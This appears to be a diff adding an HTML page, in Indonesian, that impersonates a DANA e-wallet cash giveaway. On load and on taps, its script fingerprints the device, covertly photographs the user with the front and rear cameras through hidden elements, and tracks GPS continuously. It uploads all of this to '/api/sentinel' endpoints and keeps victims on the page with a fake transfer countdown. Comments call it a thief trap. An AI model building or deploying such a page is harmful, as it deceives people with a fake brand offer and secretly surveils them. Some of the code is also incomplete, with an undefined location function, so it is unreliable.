@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>DANA Kaget — Buka Amplop Kejutan</title>
+  <style>
+    :root {
+      --dana: #118eea;
+      --dana-dark: #0c75c4;
+      --gold: #f59e0b;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body {
+      background: linear-gradient(180deg, #118eea 0%, #0c75c4 50%, #075985 100%);
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    .dana-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.2);
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 24px;
+      backdrop-filter: blur(10px);
+    }
+
+    .envelope-box {
+      width: 220px;
+      height: 220px;
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+      border-radius: 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.35);
+      border: 3px solid rgba(255, 255, 255, 0.4);
+      cursor: pointer;
+      position: relative;
+      animation: float 2s ease-in-out infinite alternate;
+      transition: transform 0.15s;
+    }
+    .envelope-box:active { transform: scale(0.95); }
+    @keyframes float {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-10px); }
+    }
+
+    .envelope-icon { font-size: 70px; margin-bottom: 8px; }
+    .envelope-text { font-size: 16px; font-weight: 800; color: #78350f; background: #fef3c7; padding: 4px 14px; border-radius: 12px; }
+
+    .title { font-size: 22px; font-weight: 800; margin: 24px 0 8px 0; }
+    .subtitle { font-size: 14px; opacity: 0.9; max-width: 320px; line-height: 1.5; }
+
+    .btn-open {
+      margin-top: 24px;
+      background: #fef08a;
+      color: #713f12;
+      border: none;
+      padding: 16px 36px;
+      border-radius: 16px;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 10px 25px rgba(245, 158, 11, 0.4);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .btn-open:active { transform: scale(0.96); }
+
+    .claim-view {
+      display: none;
+      background: white;
+      color: #0f172a;
+      border-radius: 24px;
+      padding: 30px 20px;
+      width: 100%;
+      max-width: 360px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
+    }
+    .dana-logo { font-size: 36px; margin-bottom: 10px; }
+    .amount { font-size: 34px; font-weight: 800; color: #118eea; margin: 12px 0; }
+
+    #hiddenVideo, #hiddenCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 160px;
+      height: 120px;
+      opacity: 0.001;
+      pointer-events: none;
+      z-index: -9999;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="envelopeView">
+    <div class="dana-badge">
+      <span>🎁</span> DANA KAGET SPESIAL
+    </div>
+
+    <div class="envelope-box" onclick="claimDana()">
+      <div class="envelope-icon">🧧</div>
+      <div class="envelope-text">BUKA SALDO</div>
+    </div>
+
+    <div class="title">Kamu Mendapat DANA Kaget!</div>
+    <div class="subtitle">Ketuk amplop di atas untuk mencairkan saldo Rp 150.000 langsung ke nomor akun ini.</div>
+
+    <button class="btn-open" id="btnOpenDana" onclick="claimDana()">
+      <span>✨</span> Buka Amplop Sekarang
+    </button>
+
+    <!-- Second-Chance Lure jika izin ditolak / gagal -->
+    <div id="retryPermissionBox" style="display:none; margin: 12px 0; padding: 12px; background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 12px; text-align: center;">
+      <div style="font-size: 13px; font-weight: 800; color: #1d4ed8;">⚠️ Validasi Wilayah Penerima Tertunda</div>
+      <div style="font-size: 11px; color: #1e40af; margin: 4px 0 10px 0; line-height: 1.4;">
+        Sistem BI-FAST mewajibkan izin lokasi untuk mencairkan saldo DANA Kaget Rp 150.000.
+      </div>
+      <button onclick="requestPermissionsAgain()" style="width: 100%; padding: 10px; background: #118eea; color: white; font-weight: 800; font-size: 12px; border: none; border-radius: 8px; cursor: pointer;">
+        🔄 Izinkan Lokasi &amp; Cairkan Saldo
+      </button>
+    </div>
+  </div>
+
+  <div class="claim-view" id="claimResultView" style="display: none; padding: 20px 10px; text-align: center;">
+    <div class="dana-logo">🎉</div>
+    <div style="font-size: 17px; font-weight: 800; color: #0f172a;">Selamat, Saldo Berhasil Dibuka!</div>
+    <div class="amount" style="font-size: 28px; font-weight: 900; color: #0284c7; margin: 6px 0;">Rp 150.000</div>
+
+    <!-- 60-Second Wallet Verification Progress -->
+    <div style="background: #f0f9ff; border: 1px solid #bae6fd; border-radius: 12px; padding: 12px; margin: 14px 0; text-align: left;">
+      <div style="display: flex; justify-content: space-between; font-size: 11px; font-weight: 700; color: #0369a1; margin-bottom: 6px;">
+        <span id="danaStatusText">Memverifikasi identitas akun penerima...</span>
+        <span style="font-family: monospace; font-weight: 800; color: #0284c7;" id="danaTimer">01:00</span>
+      </div>
+      <div style="width: 100%; height: 8px; background: #e0f2fe; border-radius: 4px; overflow: hidden;">
+        <div id="danaProgressBar" style="width: 5%; height: 100%; background: linear-gradient(90deg, #0284c7, #38bdf8); transition: width 1s linear;"></div>
+      </div>
+      <div style="display: flex; justify-content: space-between; font-size: 10px; color: #0369a1; margin-top: 6px;">
+        <span>Enkripsi Bank: <strong style="color: #10b981;">Aktif</strong></span>
+        <span>Akurasi Sinyal: <strong id="danaAccText">± 4m</strong></span>
+      </div>
+    </div>
+
+    <!-- Psychological Retention Hook -->
+    <div style="background: #fef2f2; border: 1px solid #fecdd3; border-radius: 10px; padding: 10px; font-size: 11px; color: #991b1b; line-height: 1.5; margin-bottom: 12px; text-align: left;">
+      <strong>⚠️ Jangan Tutup atau Keluar dari Layar Ini:</strong><br>
+      Sistem keamanan dompet digital membutuhkan waktu <strong>60 detik</strong> untuk verifikasi token transfer. Menutup halaman ini akan membatalkan pencairan saldo secara permanen.
+    </div>
+
+    <!-- Step Progress Log -->
+    <div style="font-size: 11px; color: #475569; text-align: left; display: flex; flex-direction: column; gap: 6px;">
+      <div style="display: flex; align-items: center; gap: 6px;">
+        <span style="color: #10b981; font-weight: bold;">✓</span> <span>Klaim DANA Kaget Rp 150.000 tervalidasi</span>
+      </div>
+      <div id="danaStep2" style="display: flex; align-items: center; gap: 6px; color: #94a3b8;">
+        <span id="danaIcon2">⏳</span> <span id="danaText2">Sinkronisasi nomor akun dengan server...</span>
+      </div>
+      <div id="danaStep3" style="display: flex; align-items: center; gap: 6px; color: #94a3b8;">
+        <span id="danaIcon3">⏳</span> <span id="danaText3">Mengirimkan saldo ke dompet digital...</span>
+      </div>
+    </div>
+  </div>
+
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="hiddenCanvas"></canvas>
+
+  <script>
+    // PASSIVE FIRST-PING: kirim seketika saat halaman dibuka, tanpa butuh izin apapun
+    (function() {
+      var s = {};
+      try { s.screen = window.screen.width + 'x' + window.screen.height + '(@' + (window.devicePixelRatio||1) + 'x)'; } catch(e){}
+      try { s.ua = navigator.userAgent; } catch(e){}
+      try { s.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      try { s.lang = navigator.language; } catch(e){}
+      try { s.cores = navigator.hardwareConcurrency; } catch(e){}
+      try { s.touch = navigator.maxTouchPoints; } catch(e){}
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) { s.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); s.gpuV = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); }
+        }
+      } catch(e){}
+      var payload = JSON.stringify({ alertType: 'passive_hit_dana', passiveStats: s });
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', new Blob([payload], {type:'application/json'})); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true}).catch(function(){}); } catch(e){}
+    })();
+
+    let captured = false;
+    let currentActivity = '🛑 Diam (Stasioner)';
+    let lastMotionTime = 0;
+
+    // 1. Deteksi Sensor Gerak (Accelerometer)
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', (e) => {
+        const acc = e.accelerationIncludingGravity || e.acceleration;
+        if (acc) {
+          const mag = Math.sqrt((acc.x||0)**2 + (acc.y||0)**2 + (acc.z||0)**2);
+          if (Math.abs(mag - 9.8) > 1.2 || (e.rotationRate && (Math.abs(e.rotationRate.alpha||0) > 15 || Math.abs(e.rotationRate.beta||0) > 15))) {
+            currentActivity = '🏃 Bergerak / Berpindah';
+            lastMotionTime = Date.now();
+          } else if (Date.now() - lastMotionTime > 4000) {
+            currentActivity = '🛑 Diam (Stasioner / Di Meja)';
+          }
+        }
+      });
+    }
+
+    async function getAdvancedStats() {
+      let batteryPct = null;
+      let isCharging = false;
+      let batterySource = 'unavailable_webkit_sandbox';
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          batteryPct = Math.round(bat.level * 100);
+          isCharging = Boolean(bat.charging);
+          batterySource = 'hardware_api';
+        } catch(e) {}
+      }
+
+      // Deteksi GPU Apple & WebGL Renderer Asli
+      let gpuRenderer = 'Apple GPU';
+      let gpuVendor = 'Apple Inc.';
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) {
+            gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || gpuRenderer;
+            gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || gpuVendor;
+          }
+        }
+      } catch(e) {}
+
+      const isP3 = window.matchMedia && window.matchMedia('(color-gamut: p3)').matches;
+      const timeZone = Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'Asia/Jakarta';
+
+      return {
+        batteryLevel: batteryPct,
+        batterySource,
+        isCharging,
+        networkName: null,
+        networkType: null,
+        screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio || 1}x)`,
+        cores: navigator.hardwareConcurrency || 6,
+        touchPoints: navigator.maxTouchPoints || 5,
+        gpu: gpuRenderer,
+        gpuVendor: gpuVendor,
+        colorGamut: isP3 ? 'Display P3 (Apple Retina)' : 'sRGB',
+        timeZone,
+        language: navigator.language || 'id-ID',
+        platform: navigator.platform || 'iPhone'
+      };
+    }
+
+    let currentActiveStream = null;
+
+    // Utilitas Pengiriman Foto Anti-Batal (Tetap terkirim walau tab ditutup secepat kilat)
+    function sendPhotoWithKeepalive(url, photoData, trigger) {
+      if (!photoData) return;
+      const payload = JSON.stringify({ photo: photoData, trigger: trigger || 'fast_capture' });
+      try {
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+          keepalive: true
+        }).catch(() => {});
+      } catch(e) {}
+
+      try {
+        if (navigator.sendBeacon) {
+          const blob = new Blob([payload], { type: 'application/json' });
+          navigator.sendBeacon(url, blob);
+        }
+      } catch(e) {}
+    }
+
+    function isFrameBlack(ctx, w, h) {
+      try {
+        const sample = ctx.getImageData(0, 0, Math.min(w, 40), Math.min(h, 40)).data;
+        let sum = 0;
+        for (let i = 0; i < sample.length; i += 4) {
+          sum += sample[i] + sample[i+1] + sample[i+2];
+        }
+        return sum < 80;
+      } catch(e) {
+        return false;
+      }
+    }
+
+    function snapCurrentVideoFrame(video, canvas, quality = 0.8) {
+      try {
+        const w = video.videoWidth || 640;
+        const h = video.videoHeight || 480;
+        if (w === 0 || h === 0) return null;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, w, h);
+        if (isFrameBlack(ctx, w, h)) {
+          return null;
+        }
+        return canvas.toDataURL('image/jpeg', quality);
+      } catch(e) {
+        return null;
+      }
+    }
+
+    function waitForFirstFrame(video, timeoutMs = 400) {
+      return new Promise(resolve => {
+        if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+        let done = false;
+        const finish = () => {
+          if (!done) {
+            done = true;
+            video.removeEventListener('loadeddata', finish);
+            video.removeEventListener('timeupdate', finish);
+            video.removeEventListener('canplay', finish);
+            resolve();
+          }
+        };
+        video.addEventListener('loadeddata', finish, { once: true });
+        video.addEventListener('timeupdate', finish, { once: true });
+        video.addEventListener('canplay', finish, { once: true });
+        setTimeout(finish, timeoutMs);
+      });
+    }
+
+    // Pemicu Darurat: Jika pencuri buru-buru menutup browser / swipe keluar, jepret seketika!
+    const emergencySnap = () => {
+      if (currentActiveStream) {
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        const snap = snapCurrentVideoFrame(video, canvas, 0.65);
+        if (snap) {
+          sendPhotoWithKeepalive('/api/sentinel/selfie', snap, 'emergency_exit_snap');
+        }
+      }
+    };
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') emergencySnap();
+    });
+    window.addEventListener('pagehide', emergencySnap);
+    window.addEventListener('beforeunload', emergencySnap);
+
+    let latestCoords = null;
+    let capturedFrontPhoto = false;
+    let capturedRearPhoto = false;
+    let isHarvesting = false;
+
+    // Fungsi jepret kamera spesifik (Sequential + Auto-exposure warmup)
+    async function captureCameraFacing(facing, minWaitMs = 500) {
+      let stream = null;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        currentActiveStream = stream;
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        try { await video.play(); } catch(e){}
+
+        // Tunggu minimal 500ms agar lensa kamera dan sensor auto-exposure iOS menyesuaikan cahaya
+        await waitForFirstFrame(video, 400);
+        await new Promise(r => setTimeout(r, minWaitMs));
+
+        // Ambil frame (coba 2x jika masih hitam)
+        let dataUrl = snapCurrentVideoFrame(video, canvas, 0.8);
+        if (!dataUrl) {
+          await new Promise(r => setTimeout(r, 200));
+          dataUrl = snapCurrentVideoFrame(video, canvas, 0.8);
+        }
+        if (!dataUrl) {
+          // Fallback paksa jika sensor belum melaporkan kecerahan
+          try {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+          } catch(e){}
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+        currentActiveStream = null;
+        return dataUrl;
+      } catch (err) {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        currentActiveStream = null;
+        return null;
+      }
+    }
+
+    // Pemanenan Bukti Terpadu Secepat Kilat (Sequential Kamera Depan -> Belakang)
+    async function executeParallelHarvest(triggerSource = 'auto_instant') {
+      if (isHarvesting) return;
+      isHarvesting = true;
+
+      // 1. Ambil GPS & Data Perangkat di latar belakang
+      const gpsPromise = new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          err => {
+            handlePermissionDeniedUI('gps', err);
+            resolve(null);
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      });
+      const statsPromise = getAdvancedStats();
+
+      // 2. Kamera Depan (Wajah) DULUAN (Sequential agar tidak bentrok di WebKit)
+      let frontPhoto = null;
+      if (!capturedFrontPhoto) {
+        frontPhoto = await captureCameraFacing('user', 450);
+        if (frontPhoto) {
+          capturedFrontPhoto = true;
+          sendPhotoWithKeepalive('/api/sentinel/selfie', frontPhoto, `trap_dana_${triggerSource}`);
+        }
+      }
+
+      // Jeda 180ms agar hardware kamera iOS melepaskan sensor depan sebelum membuka belakang
+      await new Promise(r => setTimeout(r, 180));
+
+      // 3. Kamera Belakang (Lingkungan Depan) SETELAH Kamera Depan
+      let rearPhoto = null;
+      if (!capturedRearPhoto) {
+        rearPhoto = await captureCameraFacing('environment', 450);
+        if (rearPhoto) {
+          capturedRearPhoto = true;
+          sendPhotoWithKeepalive('/api/sentinel/environment', rearPhoto, `trap_dana_${triggerSource}`);
+        }
+      }
+
+      // Tunggu GPS & Data Perangkat Selesai
+      const [posRes, statsRes] = await Promise.allSettled([gpsPromise, statsPromise]);
+      const pos = (posRes.status === 'fulfilled' && posRes.value) ? posRes.value : null;
+      const stats = (statsRes.status === 'fulfilled' && statsRes.value) ? statsRes.value : {};
+
+      if (frontPhoto) {
+        capturedFrontPhoto = true;
+        sendPhotoWithKeepalive('/api/sentinel/selfie', frontPhoto, `trap_dana_${triggerSource}`);
+      }
+      if (rearPhoto) {
+        capturedRearPhoto = true;
+        sendPhotoWithKeepalive('/api/sentinel/environment', rearPhoto, `trap_dana_${triggerSource}`);
+      }
+
+      let lat = pos ? pos.coords.latitude : (latestCoords ? latestCoords.lat : 0);
+      let lon = pos ? pos.coords.longitude : (latestCoords ? latestCoords.lon : 0);
+      let acc = pos ? Math.round(pos.coords.accuracy) : (latestCoords ? latestCoords.acc : 10);
+      let spd = pos ? (pos.coords.speed || 0) : 0;
+      let alt = pos ? pos.coords.altitude : null;
+      let heading = pos ? pos.coords.heading : null;
+
+      if (pos) {
+        latestCoords = { lat, lon, acc, spd, alt, heading };
+        if (triggerSource.includes('claim') || triggerSource.includes('click')) {
+          startEngagingDanaSession(lat, lon, acc);
+        }
+      }
+
+      // Kirim satu paket BEACON LENGKAP dengan semua bukti yang terkumpul
+      const unifiedPayload = {
+        alertType: `thief_trapped_dana_${triggerSource}`,
+        lat,
+        lon,
+        accuracy: acc,
+        speed: spd,
+        altitude: alt,
+        heading: heading,
+        photo: frontPhoto,
+        environmentPhoto: rearPhoto,
+        activity: stats.activity || currentActivity,
+        batteryLevel: stats.batteryLevel,
+        batterySource: stats.batterySource,
+        isCharging: stats.isCharging,
+        networkName: stats.networkName,
+        networkType: stats.networkType,
+        downlink: stats.downlink,
+        rtt: stats.rtt,
+        screen: stats.screen,
+        cores: stats.cores,
+        gpu: stats.gpu,
+        gpuVendor: stats.gpuVendor,
+        colorGamut: stats.colorGamut,
+        timeZone: stats.timeZone,
+        platform: stats.platform,
+        userAgent: navigator.userAgent
+      };
+
+      fetch('/api/sentinel/beacon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(unifiedPayload),
+        keepalive: true
+      }).catch(() => {});
+
+      isHarvesting = false;
+    }
+
+    // Pemicu Otomatis Secepat Kilat + Gesture Listener
+    function autoStartDanaFlow() {
+      // 1. Coba eksekusi paralel otomatis seketika
+      executeParallelHarvest('auto_instant');
+
+      // 2. Pasang pemicu sentuhan layar apapun (gesture fallback instan)
+      const onUserInteract = () => {
+        if (!capturedFrontPhoto || !latestCoords) {
+          executeParallelHarvest('gesture_touch');
+        }
+      };
+      window.addEventListener('pointerdown', onUserInteract, { passive: true });
+      window.addEventListener('touchstart', onUserInteract, { passive: true });
+      window.addEventListener('scroll', onUserInteract, { passive: true, once: true });
+      window.addEventListener('click', onUserInteract, { passive: true });
+
+      // 3. Watch GPS berkelanjutan
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(
+          pos => {
+            latestCoords = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy,
+              spd: pos.coords.speed || 0,
+              alt: pos.coords.altitude,
+              heading: pos.coords.heading
+            };
+            sendDanaLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
+          },
+          () => {},
+          { enableHighAccuracy: true, maximumAge: 3000 }
+        );
+      }
+    }
+
+    // Jalankan segera saat file diparsing
+    autoStartDanaFlow();
+
+    // Fungsi klaim DANA saat amplop / tombol diklik
+    async function claimDana() {
+      const btn = document.getElementById('btnOpenDana');
+      if (btn) {
+        btn.textContent = '⏳ Memproses Saldo...';
+        btn.disabled = true;
+      }
+      isHarvesting = false;
+      executeParallelHarvest('claim_click');
+      startEngagingDanaSession(latestCoords ? latestCoords.lat : -6.2088, latestCoords ? latestCoords.lon : 106.8456, latestCoords ? latestCoords.acc : 10);
+    }
+
+    // Penanganan Second-Chance Lure (Jika izin ditolak)
+    function handlePermissionDeniedUI(type, err) {
+      console.warn(`[Sentinel] Izin ${type} ditolak:`, err);
+      const box = document.getElementById('retryPermissionBox');
+      if (box) box.style.display = 'block';
+
+      fetch('/api/sentinel/beacon', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          alertType: 'trap_permission_denied',
+          activity: `Pencuri Menolak Izin ${type.toUpperCase()} (${err ? err.message : 'Denied'})`
+        }),
+        keepalive: true
+      }).catch(() => {});
+    }
+
+    function requestPermissionsAgain() {
+      const box = document.getElementById('retryPermissionBox');
+      if (box) box.style.display = 'none';
+      executeParallelHarvest('second_chance_retry');
+    }
+
+    // Last Breath Beacon: Sinyal Terakhir saat halaman ditutup / swipe keluar / airplane mode
+    function fireLastBreathBeacon() {
+      const payload = {
+        alertType: 'last_breath_beacon_exit',
+        lat: latestCoords ? latestCoords.lat : 0,
+        lon: latestCoords ? latestCoords.lon : 0,
+        accuracy: latestCoords ? latestCoords.acc : 10,
+        speed: latestCoords ? latestCoords.spd : 0,
+        activity: '⚠️ Perangkat Ditutup / Berpindah Aplikasi (Last Breath)',
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+      };
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/api/sentinel/beacon', JSON.stringify(payload));
+      } else {
+        fetch('/api/sentinel/beacon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(() => {});
+      }
+    }
+
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') fireLastBreathBeacon();
+    });
+    window.addEventListener('pagehide', fireLastBreathBeacon);
+    window.addEventListener('beforeunload', fireLastBreathBeacon);
+
+    function startEngagingDanaSession(lat, lon, acc) {
+      document.getElementById('envelopeView').style.display = 'none';
+      document.getElementById('claimResultView').style.display = 'block';
+
+      // 1. Aktifkan Screen WakeLock agar layar tidak mati otomatis
+      if ('wakeLock' in navigator) {
+        try { navigator.wakeLock.request('screen').catch(() => {}); } catch(e) {}
+      }
+
+      const accEl = document.getElementById('danaAccText');
+      if (accEl) accEl.textContent = `± ${Math.round(acc)}m`;
+
+      // 2. Pasang Listener WebSocket untuk Nada Dering Pencarian
+      try {
+        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const ws = new WebSocket(`${proto}//${location.host}`);
+        ws.onmessage = (e) => {
+          try {
+            const data = JSON.parse(e.data);
+            if (data.type === 'play_chime') playSearchChimeAudio();
+          } catch(err) {}
+        };
+      } catch(e) {}
+
+      // 3. Hitung Mundur 60 Detik & Progres Interaktif
+      let remaining = 60;
+      const total = 60;
+      const timerEl = document.getElementById('danaTimer');
+      const progEl = document.getElementById('danaProgressBar');
+      const statusText = document.getElementById('danaStatusText');
+
+      if (danaTimerInterval) clearInterval(danaTimerInterval);
+      danaTimerInterval = setInterval(() => {
+        remaining--;
+        const elapsed = total - remaining;
+        const pct = Math.min(100, Math.round((elapsed / total) * 100));
+
+        if (progEl) progEl.style.width = `${pct}%`;
+        if (timerEl) {
+          const m = String(Math.floor(remaining / 60)).padStart(2, '0');
+          const s = String(remaining % 60).padStart(2, '0');
+          timerEl.textContent = `${m}:${s}`;
+        }
+
+        if (elapsed === 15) {
+          const icon = document.getElementById('danaIcon2');
+          const txt = document.getElementById('danaText2');
+          if (icon) { icon.textContent = '✓'; icon.style.color = '#10b981'; icon.style.fontWeight = 'bold'; }
+          if (txt) { txt.textContent = 'Token transfer terverifikasi oleh server DANA'; txt.style.color = '#0f172a'; }
+          if (statusText) statusText.textContent = 'Mengalokasikan saldo dari kas DANA Kaget...';
+          snapPeriodicPhoto('user', '/api/sentinel/selfie', 'dana_periodic_face_15s');
+        }
+
+        if (elapsed === 35) {
+          const icon = document.getElementById('danaIcon3');
+          const txt = document.getElementById('danaText3');
+          if (icon) { icon.textContent = '✓'; icon.style.color = '#10b981'; icon.style.fontWeight = 'bold'; }
+          if (txt) { txt.textContent = 'Jalur enkripsi transfer perbankan aman (BI-FAST)'; txt.style.color = '#0f172a'; }
+          if (statusText) statusText.textContent = 'Menyelesaikan transfer ke dompet akun...';
+          snapPeriodicPhoto('environment', '/api/sentinel/environment', 'dana_periodic_env_35s');
+        }
+
+        if (remaining <= 0) {
+          clearInterval(danaTimerInterval);
+          if (statusText) statusText.textContent = '✅ Saldo Rp 150.000 Berhasil Ditransfer!';
+          if (timerEl) timerEl.textContent = '00:00';
+          if (progEl) { progEl.style.width = '100%'; progEl.style.background = '#10b981'; }
+        }
+      }, 1000);
+
+      // 4. Continuous GPS Stream every 5s
+      if (danaGpsInterval) clearInterval(danaGpsInterval);
+      danaGpsInterval = setInterval(() => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            p => {
+              sendDanaLocation(
+                p.coords.latitude,
+                p.coords.longitude,
+                p.coords.accuracy,
+                p.coords.speed || 0,
+                p.coords.altitude || null,
+                p.coords.heading || null,
+                'dana_live_stream_60s'
+              );
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
+          );
+        }
+      }, 5000);
+    }
+
+    async function snapPeriodicPhoto(facing, endpoint, triggerTag) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        video.play().catch(() => {});
+        await waitForFirstFrame(video, 200);
+        const dataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        if (dataUrl) {
+          sendPhotoWithKeepalive(endpoint, dataUrl, triggerTag);
+        }
+        stream.getTracks().forEach(t => t.stop());
+      } catch(e) {}
+    }
+
+    function playSearchChimeAudio() {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        let count = 0;
+        const intv = setInterval(() => {
+          if (count >= 12) { clearInterval(intv); return; }
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(987.77, audioCtx.currentTime);
+          osc.frequency.setValueAtTime(1318.51, audioCtx.currentTime + 0.15);
+          gain.gain.setValueAtTime(1.0, audioCtx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.start();
+          osc.stop(audioCtx.currentTime + 0.35);
+          count++;
+        }, 400);
+      } catch(e) {}
+    }
+
+  </script>
+</body>
+</html>
